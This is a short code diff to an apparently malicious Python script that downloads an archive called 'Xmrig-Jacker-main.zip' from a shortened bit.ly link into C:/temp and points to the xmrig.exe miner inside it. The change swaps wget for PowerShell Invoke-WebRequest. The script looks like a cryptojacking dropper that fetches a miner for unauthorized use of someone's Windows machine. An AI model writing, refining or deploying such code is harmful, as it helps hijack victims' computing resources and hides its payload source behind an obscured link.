@@ -6,11 +6,11 @@ import psutil
 import ctypes
 
 def download_and_extract(url, output_dir):
-    subprocess.run(["wget", url, "-O", os.path.join(output_dir, "Xmrig-Jacker-main.zip")])
+    subprocess.run(["powershell", "Invoke-WebRequest", url, "-OutFile", os.path.join(output_dir, "Xmrig-Jacker-main.zip")])
     shutil.unpack_archive(os.path.join(output_dir, "Xmrig-Jacker-main.zip"), output_dir)
 
 def main():
-    temp_dir = r"C:\temp"
+    temp_dir = "C:/temp"
     xmrig_path = os.path.join(temp_dir, "Xmrig-Jacker-main", "xmrig", "xmrig.exe")
 
     download_url = 'https://bit.ly/444WCb3'
